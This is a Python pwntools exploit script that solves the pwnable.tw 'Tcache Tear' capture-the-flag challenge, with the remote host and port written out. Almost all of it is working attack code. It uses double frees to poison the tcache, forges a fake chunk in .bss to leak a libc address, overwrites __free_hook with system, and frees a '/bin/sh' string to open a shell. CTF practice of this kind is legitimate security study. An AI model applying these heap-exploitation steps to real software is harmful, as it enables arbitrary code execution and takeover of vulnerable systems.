#!/usr/bin/env python3

# Implements the intended solution: Tcache Tear

from pwn import *

import os
os.chdir("./patched")

enc = lambda a: a.encode() if isinstance(a, str) else a
sla = lambda a, b: r.sendlineafter(enc(a), enc(b))
snl = lambda a: r.sendline(enc(a))
sna = lambda a, b: r.sendafter(enc(a), enc(b))
snd = lambda a: r.send(enc(a))
rcu = lambda a: r.recvuntil(enc(a), drop=True)
rcv = lambda a: r.recv(enc(a))
rcl = lambda: r.recvline()
p24 = lambda a: p32(a)[:-1]
l64 = lambda a: u64(a.ljust(8, b"\x00"))
l32 = lambda a: u64(a.ljust(4, b"\x00"))
l16 = lambda a: u64(a.ljust(2, b"\x00"))
lin = lambda a: log.info(f"{hex(a)=}")
sen = lambda a: str(a).encode()
mangle = lambda ptr, pos: ptr ^ (pos >> 12)

exe = ELF("./tcache_tear_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

serv = "chall.pwnable.tw"
port = 10207

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        cmd = [exe.path]
        r = process(cmd)
        if args.GDB:
            gdb.attach(r, gdbscript="""
            b *0x400b14
            b *0x00400c54
            """)
    return r

r = conn()


def alloc(size: int, data: bytes):
    # assert size <= 0xff and size >= 0
    sla(b'choice :', b'1')
    sla(b'Size:', sen(size))
    if size > 0:
        sna(b'Data:', enc(data))

def free():
    sla(b'choice :', b'2')

def read_from_bss():
    sla(b'choice :', b'3')
    r.recvuntil(b':') # Get rid of b'Name :'
    return r.recv(numb=0x20)

def main():

    # Based on writeups online, the intended solution seems to be a technique called tcache tear where we need to
    # forge a chunk that will get freed into the unsorted bin in order to leak libc from its fd and bk ptrs. 
    # For all our arb-writes, we use a double-free to poison the tcache to lead into the arb-write

    # Put data into bss - this is not only required by the binary, but also is so that we can chunk-forge to a size of 0x420 (needs to avoid the tcache)
    sna(b'Name:', b'\x00'*0x8 + p64(0x421) + b'A'*0x10)

    # We need to forge the following for what would be the next chunk of the forged chunk at 0x602070 for the check to succeed
    # 1. prev_inuse bit of the forged chunk needs to be 1 (else it will try to consolidate backwards)
    # 2. prev_inuse bit of the next next chunk needs to be 1 (else it will try to consolidate forwards)
    # Interestingly, we don't need the prev_size of the next chunk needs to match the size of the forged chunk
    alloc(0x8, b'B'*0x8)
    free()
    free()
    alloc(0x8, p64(0x602070 + 0x410))
    alloc(0x8, b'B'*0x8) 
    alloc(0x8, b''.join([ # Because of a heap overflow we can actly write basically as much as we want here
        p64(0x420), # prev_size (not necessary to match the size of the forged chunk, no check done there)
        p64(0x21), # size of the next chunk (needed because that's how we figure out where the next next chunk is)
        b'C'*0x10, # arb user data
        p64(0x20), # prev_size of the next next chunk (doesn't rly matter since it's not checked)
        p64(0x21) # size of the next next chunk (IMPT: the prev_inuse bit must be set)
        ]))

    # Double free to allocate to 0x602070 so that it can be freed into the unsorted bin
    alloc(0x20, b'E'*0x10)
    free()
    free()
    alloc(0x20, p64(0x602070)) # This inserts the chunk at name+0x10 into the tcache
    alloc(0x20, b'F'*0x10)
    alloc(0x20, b'G'*0x10) # Pointer at 0x602088 now points to 0x602070

    # Free it so that the forged chunk's fd and bk ptrs are libc leaks
    free()

    # Using option 3 of the binary, we read 0x20 bytes from 0x602060 and get our libc leak
    libc.address = u64(read_from_bss()[16:24]) - 0x204ca0 - 0x1e7000 # Unsorted bin HEAD is av->bins[0], which is only allocated later in a writable area of libc that isn't mmap-ed until it is loaded in
    log.info(f"{hex(libc.address)=}")

    # Overwrite free_hook within the libc with libc system and run free to spawn a shell
    for _ in range(4): # Get rid of the forged chunk from the large bin first - otherwise we end up with a piece off that chunk that does not go into the tcache
        alloc(0xef, b'bruh') # We can allocate to a size of at most 0xff, so we can only incrementally get rid of this forged chunk from the bin
    alloc(0x30, b'G'*0x8)
    free()
    free()
    alloc(0x30, p64(libc.sym.__free_hook))
    alloc(0x30, b'H'*0x8)
    alloc(0x30, p64(libc.sym.system))
    alloc(0x40, b'/bin/sh\x00')

    # Actuate the free_hook by freeing
    free()

    r.interactive()


if __name__ == "__main__":
    main()
